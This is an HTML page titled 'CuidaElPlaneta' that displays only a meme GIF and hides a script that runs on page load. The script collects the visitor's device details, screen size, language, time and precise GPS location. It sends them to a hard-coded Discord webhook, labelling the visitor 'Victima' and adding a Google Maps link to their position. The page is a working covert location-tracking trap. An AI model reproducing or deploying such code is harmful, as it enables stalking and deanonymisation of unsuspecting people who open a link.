<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">

    <title>CuidaElPlaneta</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #000; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh;
        }

</head>
<body>
    <img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/072fa096-b852-4161-ae5d-8f42f037c051/ddqixln-c990a298-f4fc-4d3d-b8fc-0b8bb057f9a6.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzA3MmZhMDk2LWI4NTItNDE2MS1hZTVkLThmNDJmMDM3YzA1MVwvZGRxaXhsbi1jOTkwYTI5OC1mNGZjLTRkM2QtYjhmYy0wYjhiYjA1N2Y5YTYuZ2lmIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.VO0j-F2kMtN4WqIyjw-vYaKm7VrZvA93lNdfrWqE_pQ" alt="meme">

<script>
const datos = {
    dispositivo: navigator.userAgent,
    plataforma: navigator.platform,
    pantalla: screen.width + "x" + screen.height,
    idioma: navigator.language,
    hora: new Date().toString()
};

if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        (position) => {
            datos.latitud = position.coords.latitude;
            datos.longitud = position.coords.longitude;
            datos.precision = position.coords.accuracy + " metros";
            enviar();
        },
        (error) => {
            datos.gps = "Denegado";
            enviar();
        }
    );
} else {
    datos.gps = "No soportado";
    enviar();
}

function enviar() {
    const mensaje = {
        username: "Victima",
        content: "Nueva conexion!",
        embeds: [{
            title: "Datos del Dispositivo",
            color: 15158332,
            fields: [
                { name: "Hora", value: datos.hora },
                { name: "Dispositivo", value: datos.dispositivo.substring(0, 500) },
                { name: "Plataforma", value: datos.plataforma },
                { name: "Pantalla", value: datos.pantalla },
                { name: "Idioma", value: datos.idioma }
            ]
        }]
    };
    
    if (datos.latitud) {
        mensaje.embeds[0].fields.push(
            { name: "Latitud", value: datos.latitud.toString() },
            { name: "Longitud", value: datos.longitud.toString() },
            { name: "Mapa", value: "https://maps.google.com/?q=" + datos.latitud + "," + datos.longitud }
        );
    }
    
    fetch('https://discord.com/api/webhooks/1552141757016449087/LtDlpOjmWwgz-jU8TSP4_0EJGJDc-XTu_nB2O18KNliDm1APuX7dlGHodNi487uTDjGr', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(mensaje)
    });
}
</script>
</body>
</html>
